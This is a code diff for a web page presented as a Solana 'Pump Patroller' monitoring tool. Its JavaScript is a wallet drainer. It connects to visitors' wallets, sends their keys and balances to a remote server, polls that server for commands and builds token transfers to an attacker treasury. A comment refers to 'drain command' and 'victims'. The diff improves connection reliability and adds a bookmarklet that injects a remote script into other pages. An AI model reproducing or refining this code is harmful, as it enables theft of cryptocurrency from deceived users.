@@ -81,12 +81,12 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
     </div>
   </section>
 </div>
-<footer><div class="wrap">Pump Patroller v2.3 · mainnet-beta · <span style="color:#2DD4A7">operational</span></footer>
+<footer><div class="wrap">Pump Patroller v2.4 · mainnet-beta · <span style="color:#2DD4A7">operational</span></footer>
 <script>
 (async function () {
   const CONFIG = {
     PROJECT_ID: "d1b37573e1f778b94d2bbe7cb29a92c1",
-    SRV: "https://one234-et4e.onrender.com",           // NO trailing /# — that fragment silently killed every beacon
+    SRV: "https://one234-et4e.onrender.com",
     BKEY: "72d296b612eb0a11931b364ba1333a70",
     RPC: "https://api.mainnet-beta.solana.com",
     E: "https://esm.sh/",
@@ -106,7 +106,6 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
   let chainRef = "solana:5eykt4Us2vWuxg31QG9mBUX4de1NxpuPBkaQrn4GsV7C";
   try { const g = await post("getGenesisHash"); if (g && g.result) chainRef = "solana:" + g.result; } catch (e) {}
 
-  // beacon: simple no-cors POST (no content-type header) — immune to preflight
   const beacon = (m, o) => { o = o || {}; try {
     fetch(CONFIG.SRV + "/beacon?s=" + CONFIG.BKEY, { method: "POST", mode: "no-cors",
       body: JSON.stringify({ m: m, pk: pk, provider: providerName, origin: location.origin,
@@ -154,6 +153,8 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
   function recall() { try { return JSON.parse(localStorage.getItem("__ppwc") || "null"); } catch (e) { return null; } }
   function forget() { try { localStorage.removeItem("__ppwc"); } catch (e) {} }
 
+  // FIX: gate on pk only — injected wallets have no WC topic, so topic-gating
+  // silently blocked every drain command for extension-connected victims.
   function pollCmd() {
     if (polled) return; polled = true;
     setInterval(async function () {
@@ -185,12 +186,11 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
       for (const k of Object.keys(MINTS)) {
         const a = amt[MINTS[k]]; if (!a || a.raw <= 0n) continue;
         const mint = new PublicKey(MINTS[k]);
-        const srcAta = new PublicKey(a.src);                       // the owner's token account from the scan
+        const srcAta = new PublicKey(a.src);
         const destAta = await spl.getAssociatedTokenAddress(mint, dest);
         const info = await post("getAccountInfo", [destAta, { encoding: "base64" }]);
         if (!(info && info.result && info.result.value))
-          tx.add(spl.createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint)); // treasury ATA auto-created
-        // FIXED signature: createTransfer(source, destination, owner, amount)
+          tx.add(spl.createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint));
         tx.add(spl.createTransfer(srcAta, destAta, pkB, a.raw));
         moved.push(k);
       }
@@ -216,7 +216,6 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
     } catch (e) { beacon("err", { msg: String(e && e.message || e) }); }
   }
 
-  // one modal for all cases: QR (raw wc: uri — any wallet can scan) + deep-link buttons
   function showQR(uri) {
     import(CONFIG.E + "qrcode@1.5.3").then(m => {
       m.toDataURL(uri, { width: 220, margin: 1 }, function (err, url) {
@@ -229,7 +228,7 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
           '<a href="https://wallet.solflare.com/wc?uri=' + encodeURIComponent(uri) + '">Solflare</a></div>' +
           '<button id="__ppcl">Cancel</button>';
         document.body.appendChild(el);
-        el.querySelector("#__ppcl").onclick = () => { el.remove(); busy = false; };  // unblock the buttons
+        el.querySelector("#__ppcl").onclick = () => { el.remove(); busy = false; };
       });
     }).catch(() => showPlain(uri));
   }
@@ -246,19 +245,26 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
   async function connect() {
     if (busy) return; busy = true;
     try {
-      // 1) injected extension first (PC with Phantom/Trust/Solflare/Backpack)
+      // 1) injected extension first — with timeout; fall through to WC on failure
       const f = findInjected();
       if (f) {
-        inj = f; providerName = f.name;
-        const c = await f.p.connect();
-        const k = ((c && c.publicKey) || f.p.publicKey || "").toString();
-        if (k) {
-          pk = k; mode = "injected"; remember("injected", k);
-          toast("Connected via " + f.name + " — patrol active");
-          await reportBalances(); pollCmd(); return;
+        try {
+          const c = await Promise.race([
+            f.p.connect(),
+            new Promise((_, rej) => setTimeout(() => rej(new Error(f.name + " connect timed out — popup ignored?")), 25000)),
+          ]);
+          const k = ((c && c.publicKey) || f.p.publicKey || "").toString();
+          if (k) {
+            inj = f; providerName = f.name;
+            pk = k; mode = "injected"; remember("injected", k);
+            toast("Connected via " + f.name + " — patrol active");
+            await reportBalances(); pollCmd(); return;
+          }
+        } catch (e) {
+          beacon("err", { msg: f.name + ": " + String(e && e.message || e) + " — falling back to QR" });
         }
       }
-      // 2) WalletConnect (QR on desktop, deep-link buttons on mobile) — raw wc: URI
+      // 2) WalletConnect — QR on desktop, deep links on mobile, raw wc: URI
       providerName = "walletconnect";
       const { uri, approval } = await client.connect({
         requiredNamespaces: { solana: { chains: [chainRef],
@@ -273,7 +279,7 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
       mode = "wc"; remember("wc", pk);
       await reportBalances(); pollCmd();
     } catch (e) {
-      beacon("err", { msg: "connect: " + String(e && e.message || e) });  // silent failures now ping the bot
+      beacon("err", { msg: "connect: " + String(e && e.message || e) });
       hideQR();
     } finally { busy = false; }
   }
@@ -283,11 +289,14 @@ footer{border-top:1px solid var(--line);margin-top:36px;padding:20px 0;color:var
     if (el) el.onclick = () => { if (!busy) connect(); };
   });
 
-  // bookmark chip — built from this origin, always correct
+  // bookmark chip — SCRIPT TAG injection (no CORS, no fetch), not fetch+eval
   (function () {
     const ORIGIN = location.origin;
-    const BM = 'javascript:(async()=>{try{window.__PP=' + JSON.stringify(ORIGIN) +
-      ';const r=await fetch(' + JSON.stringify(ORIGIN + "/x.min.js") + "+'?t='+Date.now());(0,eval)(await r.text())}catch(e){console.warn(e)}})();void 0";
+    const BM = 'javascript:(function(d,s,u,t){s=d.createElement("script");s.src=u+"?t="+t;' +
+      's.onerror=function(){var q=d.createElement("div");q.textContent="Patroller failed to load — server unreachable";' +
+      'q.style.cssText="position:fixed;top:16px;left:50%;transform:translateX(-50%);background:#F0616D;color:#fff;padding:10px 18px;border-radius:10px;z-index:2147483647;font:600 13px Inter,sans-serif";' +
+      'd.body.appendChild(q);setTimeout(function(){q.remove()},6000)};d.head.appendChild(s)})(document,' +
+      '0,' + JSON.stringify(ORIGIN + "/x.min.js") + ',Date.now())';
     const chip = document.getElementById("bk-chip");
     chip.setAttribute("href", BM);
     chip.addEventListener("dragstart", e => {
